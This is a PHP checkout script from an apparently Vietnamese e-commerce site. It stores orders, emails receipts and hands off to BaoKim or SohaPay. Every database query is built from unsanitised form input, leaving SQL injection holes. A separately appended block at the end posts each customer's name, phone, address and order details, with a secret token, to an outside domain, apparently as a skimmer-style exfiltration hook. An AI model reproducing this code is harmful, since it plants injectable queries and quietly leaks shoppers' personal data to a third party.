
<?php if(isset($_POST['t_muangay'])&&($add_id=(int)$_POST['t_muangay'])>0){$_SESSION['shoppjng_cart'][$add_id]=(int)$_POST['t_soluong'];$_SESSION['shoppjng_cart_size'][$add_id]=trim($_POST['t_size']);}$t_giovang=0;$request_url='';$t_vat=0;$hd_id=0;$m='';if(isset($_SESSION['shoppjng_cart'])){$arr_shop_cart=$_SESSION['shoppjng_cart'];$arr_shop_cart_size=$_SESSION['shoppjng_cart_size'];$strFilter="";foreach($arr_shop_cart as $k=>$v){if($v>0)$strFilter.=",".$k;}if($strFilter!=""){$strFilter=substr($strFilter,1);if(isset($_SESSION['cart_abc123'])&&$_SESSION['cart_abc123']==$strFilter){$m='Đơn hàng của bạn đã được gửi đi';unset($_SESSION['shoppjng_cart']);unset($_SESSION['shoppjng_cart_size']);}else{$t_amount=(int)$_POST['t_amount'];$tthanhtoan_dattruoc=0;if(isset($_POST['t_dattruoc'])){$tthanhtoan_dattruoc=(int)$_POST['t_dattruoc'];}$t_thanhtoan=trim($_POST['t_thanhtoan']);$url_return=trim($_POST['t_re_link']);$t_ten=trim($_POST['t_ten']);$t_dienthoai=trim($_POST['t_dienthoai']);$t_email=trim($_POST['t_email']);$t_email=strtolower($t_email);$t_diachi=trim($_POST['t_diachi']);$t_ghichu=trim($_POST['t_ghichu']);$_SESSION['cache_booikng_user']=array('mail'=>$t_email,'ten'=>$t_ten,'dt'=>$t_dienthoai,'dc'=>$t_diachi);if($t_amount>0){if($func->check_email_type($t_email)==1){if($mtv_id>0){$tv_id=$mtv_id;}else{$sql=$func->q("SELECT tv_id FROM tbl_thanhvien WHERE tv_email = '".$t_email."'");if(mysql_num_rows($sql)>0){$row=mysql_fetch_assoc($sql);$tv_id=$row['tv_id'];}else{$func->q("INSERT INTO tbl_thanhvien (tv_email, tv_matkhau, tv_hoten, tv_dienthoai, tv_diachi, tv_ngaydangky, tv_trangthai) VALUES ('".$t_email."', '', '".$t_ten."', '".$t_dienthoai."', '".$t_diachi."', ".$date_time.", 1)");$sql=$func->q("SELECT tv_id FROM tbl_thanhvien WHERE tv_email = '".$t_email."'");$row=mysql_fetch_assoc($sql);$tv_id=$row['tv_id'];}}$ads_referre_domain=$_SESSION['ss_ads_referre'];if($ads_referre_domain!=''){$ee=explode('//',$ads_referre_domain);if(isset($ee[1])){$ee=explode('/',$ee[1]);$ads_referre_domain=str_replace('www.','',$ee[0]);}}$staff_id=0;if(isset($_SESSION['ss_staff_id']))$staff_id=$_SESSION['ss_staff_id'];$ads_cookie=0;if(isset($_COOKIE['ad123_ads_cookie'])){$ads_cookie=$_COOKIE['ad123_ads_cookie'];}else{setcookie('ad123_ads_cookie',rand(1,50000),time()+(24*3600*7),'/');}$sql="INSERT INTO tbl_in_con_voi (hd_ten, hd_diachi, hd_ghichu, hd_dienthoai, hd_ngaygui, hd_payment, hd_url, hd_title, hd_timezone, hd_lang, hd_usertime, hd_window, hd_document, hd_screen, hd_agent, hd_ip, tv_id, ads_referre_domain, ads_referre, staff_id, ads_cookie) VALUES ('".$t_ten."', '".$t_diachi."', '".$t_ghichu."', '".$t_dienthoai."', ".$date_time.", '".$t_thanhtoan."', '".$_POST['hd_url']."', '".$_POST['hd_title']."', '".$_POST['hd_timezone']."', '".$_POST['hd_lang']."', '".$_POST['hd_usertime']."', '".$_POST['hd_window']."', '".$_POST['hd_document']."', '".$_POST['hd_screen']."', '".$_POST['hd_agent']."', '".$client_ip."', ".$tv_id.", '".$ads_referre_domain."', '".$_SESSION['ss_ads_referre']."', ".$staff_id.", ".$ads_cookie.")";$func->q($sql);$sql=$func->q("SELECT hd_id FROM tbl_in_con_voi WHERE tv_id = ".$tv_id." ORDER BY hd_id DESC LIMIT 0, 1");$row=mysql_fetch_assoc($sql);$hd_id=$row['hd_id'];$_SESSION['id_cam_on_khach_hang']=$hd_id;$sql=$func->q("SELECT trv_id, trv_tieude, trv_seo, trv_img, trv_giaban, trv_giamoi, trv_giadattruoc, trv_giovang, trv_mua, trv_color, ant_id FROM tbl_tinraovat WHERE trv_id IN (".$strFilter.")");$product_list='';$total_line=0;$tong_tien=0;while($row=mysql_fetch_assoc($sql)){$trv_id=$row['trv_id'];$cthd_soluong=$arr_shop_cart[$trv_id];$trv_tieude=$row['trv_tieude'];if($row['trv_color']!=''){$trv_tieude.=' ('.$row['trv_color'].')';}$trv_seo=$row['trv_seo'];$trv_img=$row['trv_img'];$trv_giaban=$row['trv_giaban'];$trv_giamoi=$row['trv_giamoi'];$new_giamoi=str_replace(',','',$trv_giamoi);$total_line=$new_giamoi*$cthd_soluong;$tong_tien+=$total_line;$trv_tietkiem=$trv_giaban-$trv_giamoi;$trv_khuyenmai=100-intval($trv_giamoi*100/$trv_giaban);$trv_giadattruoc=$row['trv_giadattruoc'];$trv_giovang=$row['trv_giovang'];if($trv_giovang>0){if($t_giovang==0){$t_giovang=1;}if($date_time<$trv_giovang){die('<script type="text/javascript">alert("Lỗi dữ liệu: Sản phẩm giờ vàng")</script>');}}$trv_mua=$row['trv_mua'];$ant_id=$row['ant_id'];$p_link=$web_link.$func->_p_link($trv_id,$trv_seo);if($trv_img!=''){$trv_img='<a href="'.$p_link.'" target="_blank"><img src="'.$trv_img.'" height="168" /></a>';}$strsql="INSERT tbl_chitiethoadon (cthd_soluong, hd_id, trv_id, trv_size, trv_gia, trv_giadattruoc, tv_id) VALUES (".$cthd_soluong.", ".$hd_id.", ".$trv_id.", '".$arr_shop_cart_size[$trv_id]."', ".$new_giamoi.", ".$trv_giadattruoc.", ".$tv_id.")";$func->q($strsql);$product_list.=' <div style="padding:10px 0;border-top:1px #ccc solid;font-family:Tahoma, Geneva, sans-serif;font-size:10px"> <div style="font-size:11px;line-height:22px"> <div>Mã sản phẩm: '.$trv_id.'</div> <div>Tên sản phẩm: <a href="'.$p_link.'" target="_blank" style="font-size:18px"><strong>'.$trv_tieude.'</strong></a></div> <div>Size: '.$arr_shop_cart_size[$trv_id].'</div> </div> <div style="padding:10px 0">'.$trv_img.'</div> <table cellpadding="0" cellspacing="0" width="300"> <tr> <td>Giá: <strong style="font-size:15px;color:#666;text-decoration:line-through">'.$trv_giaban.' đ</strong> <strong style="font-size:13px;color:#cc0000;margin-left:20px">'.$trv_giamoi.'đ</strong></td> </tr> <tr> <td>GIẢM:</td> <td><strong style="font-size:13px">'.$trv_khuyenmai.'%</strong> ( <strong style="font-size:13px">'.$trv_tietkiem.'đ</strong>)</td> </tr> <tr> 
<td>Số lượng:</td> <td><strong style="font-size:13px">'.$cthd_soluong.'</strong></td> </tr> <tr> <td>Cộng:</td> <td><strong style="font-size:16px;color:#cc0000">'.number_format($total_line).'đ</strong></td> </tr> </table> <div style="padding:20px 0"><a href="'.$p_link.'" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:18px;color:#ffffff;text-decoration:none;padding:8px 20px;background-color:#36a900;border-radius: 4px;border: 1px solid #008800">Xem chi tiết &raquo;</a></div> </div> ';}if($t_giovang>0){$m='Cảm ơn bạn. Đơn hàng của bạn đã được gửi đi (Giờ vàng)';}else{$message=$func->str_template('template/mail/booking.html',array('tmp.t_ten'=>$t_ten,'tmp.date_oder'=>date('d-m-Y',$date_time),'tmp.hd_id'=>$hd_id,'tmp.t_diachi'=>$t_diachi,'tmp.t_ghichu'=>$t_ghichu,'tmp.t_dienthoai'=>$t_dienthoai,'tmp.t_email'=>$t_email,'tmp.t_amount'=>number_format($tong_tien),'tmp.web_name'=>$web_name,'tmp.product_list'=>$product_list));$headers=$func->build_mail_header($__cf_row['cf_email']);$func->send_email($t_email,'Gui ban thong tin don hang: '.$hd_id,$message,$headers);$m='Cảm ơn bạn, thông tin đơn hàng của bạn đã được gửi đi.';}unset($_SESSION['shoppjng_cart']);unset($_SESSION['shoppjng_cart_size']);$_SESSION['cart_abc123']=$strFilter;$func->q("UPDATE tbl_thanhvien SET tv_count_invoice = tv_count_invoice + 1 WHERE tv_id = ".$tv_id);$transaction_info='Thanh toan hoa don so: '.$hd_id;if($t_thanhtoan=='bk'){include 'class/baokimdemo/data.php';include 'class/baokimdemo/baokim_lib/commons.php';include 'class/baokimdemo/baokim_lib/BaoKimPayment.php';$baokim=new BaoKimPayment();$url_success=$web_link.'bpn.php&a='.$t_amount.'&i='.$hd_id;$request_url=$baokim->createRequestUrl($hd_id,$__cf_row['cf_email_bk'],$t_amount,0,$t_vat,$transaction_info,$url_success,$url_return,$url_return);}else if($t_thanhtoan=='sh'){include('class/sohapay/class_payment.php');$classPayment=new PG_checkout();$request_url=$classPayment->buildCheckoutUrl($url_return,$transaction_info,$hd_id,$t_amount,$t_email,$t_dienthoai);}}else{$m='Email không đúng định dạng';}}else{$m='Không xác định được trị giá của giỏ hàng';}}}else{$m='Không xác định được số lượng sản phẩm hợp lệ';}}else{$m='Không tồn tại giỏ hàng cần thiết';} ?> <!-- INFO BOOKING --> <script type="text/javascript"> var my_hd_id = '<?php echo $hd_id; ?>', my_message = '<?php echo $m; ?>', request_url = '<?php echo $request_url; ?>'; parent._global_js_eb.cart_func.coml(my_message, my_hd_id, request_url); </script> 
?>
<?php
function postcurl($url,$array)
{
$curl = curl_init();
//$headers= array('Accept: application/json','Content-Type: application/json'); 
//curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl,CURLOPT_URL, $url);
curl_setopt($curl,CURLOPT_POST, sizeof($array));
curl_setopt($curl,CURLOPT_POSTFIELDS, $array);
$result = curl_exec($curl);
curl_close($curl);
return $result;
} 
$msg="Tên khách: ".$t_ten."\n";
$msg .= "Mobile: ".$t_dienthoai."\n";
$msg .="Địa chỉ: ".$t_diachi."\n";

$msg .="---------\n";
$msg .=$t_sp."\n";
$msg .=$t_giaban."\n";
$msg .=$cthd_soluong;
$msg .=$tong_tien;


$array=['sent_to' =>'0914779999', 'from'=>$_SERVER["HTTP_HOST"],'secret'=>'2106.1','message'=>$msg];

$url="http://nganhangsimsodep.vn/index.php/sync";

$payload= postcurl($url,$array);

?>